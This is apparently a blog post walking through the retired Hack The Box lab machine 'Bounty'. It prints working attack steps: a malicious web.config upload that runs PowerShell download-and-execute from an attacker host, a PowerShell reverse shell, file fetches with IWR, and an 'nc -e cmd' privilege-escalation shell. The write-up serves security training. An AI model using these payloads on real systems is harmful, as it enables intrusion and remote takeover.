---
layout: post
title: "HTB-Bounty"
date: 2020-02-16 14:55:00 +0000
categories: HTB-Walkthrough
---

![bounty](/assets/img/bounty.png)

This is a great box from the HTB 'retired' list.

Diving straight in with nmap then...
`nmap -sV -Pn -v 10.10.10.93 |tee -a boun.txt`

```

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Not a great deal of choice...

Lets have a closer look.

```

root@kali:~/HTB/retired/bounty# nmap --script=vuln -p80 10.10.10.93
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-26 07:45 EST
Nmap scan report for bounty.htb (10.10.10.93)
Host is up (0.092s latency).

PORT   STATE SERVICE
80/tcp open  http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2015-1635:
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-1635
|       A remote code execution vulnerability exists in the HTTP protocol stack (HTTP.sys) that is
|       caused when HTTP.sys improperly parses specially crafted HTTP requests. An attacker who
|       successfully exploited this vulnerability could execute arbitrary code in the context of the System accoun>
|
|     Disclosure date: 2015-04-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635
|_      https://technet.microsoft.com/en-us/library/security/ms15-034.aspx

Nmap done: 1 IP address (1 host up) scanned in 273.70 seconds

```

Forced-browsing with gobuster...

`gobuster -u http://10.10.10.93 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -x .aspx,.asp,.html`

```

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.93/
[+] Threads      : 50
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : aspx,asp,html
[+] Timeout      : 10s
=====================================================
2019/11/13 09:38:51 Starting gobuster
=====================================================
Progress: 15215 / 882244 (1.72%)/transfer.aspx (Status: 200)
/UploadedFiles (Status: 301)
/uploadedFiles (Status: 301)
/uploadedfiles (Status: 301)
=====================================================
2019/11/13 10:13:53 Finished
=====================================================

```

/transfer.aspx is worth looking at closer....

we find that we can only upload web.config files...

we have to create an xml file and call it web.config

```xml

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
       <system.webServer>
              <handlers accessPolicy="Read, Script, Write">
                     <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
              </handlers>
              <security>
                     <requestFiltering>
                            <fileExtensions>
                                   <remove fileExtension=".config" />
                            </fileExtensions>
                            <hiddenSegments>
                                   <remove segment="web.config" />
                            </hiddenSegments>
                     </requestFiltering>
              </security>
       </system.webServer>
</configuration>
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell -c iex(New-Object Net.WebClient).DownloadString('http://10.10.14.19/shell.ps1');")
o = cmd.StdOut.Readall()
Responsse.write(o)
%>

```

If you haven't already, its a good idea to get to know a little xml; particularly in the context of exploiting xmlrpc. It's also important to familiarize yourself with useful powershell commands.
The IEX DownloadString one above is very useful, as is the IWR (Invoke-WebRequest) one. You will find them invaluable when working with Windows targets.


Anyway...the exploit above requires us to host the shell.ps1 file so
get a webserver running.
Incidentally, the shell.ps1 file can be found in /usr/share/webshells...modify it to call us on 4444.
we can do this by appending the following to the file...
`Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.19 -Port 4444`

so...the webserver to serve shell.ps1:

`python3 -m http.server 80`

Also get an nc shell running to catch the resulting reverse-shell connection...
`nc -nlvp 4444`

we get PowerShell command-line as user merlin....and access to the user flag.

```

PS C:\users\merlin\desktop> more user.txt
#  e29xxxxxxxxxxxxxxxxxxxf

```

The laziest way to continue would be to use windows-exploit-suggester.py

get nc.exe onto target..
`IWR -uri http://10.10.14.19/nc.exe -outfile c:\boo\nc.exe`

...then get cli shell...do
`systeminfo`

copy systeminfo to kali file sysinfo.txt

```

root@kali:~/HTB/retired/bounty# python wes.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2020-01-26-mssb.xls
[*] done
root@kali:~/HTB/retired/bounty# python wes.py --database 2020-01-26-mssb.xls --systeminfo sysinfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*]
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5>
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5>
[*]
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Importa>
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Im>
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

```

select ms10-015 to try escalation...not listed here...but does work...I've used it recently and I've got it readily to hand.

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.19/priv.exe','C:\boo\priv.exe')"
```

`c:\boo\priv.exe "c:\boo\nc.exe 10.10.14.19 999 -e cmd"`

```

C:\Users\Administrator\Desktop>type root.txt
type root.txt
c8xxxxxxxxxxxxxxxxxxxxea

```

It worked !!! If it had failed, I could have gone down the suggested list trying each, If the machine was patched against those vulnerabilities it would have required closer manual or scripted inspection. 

##################

:)



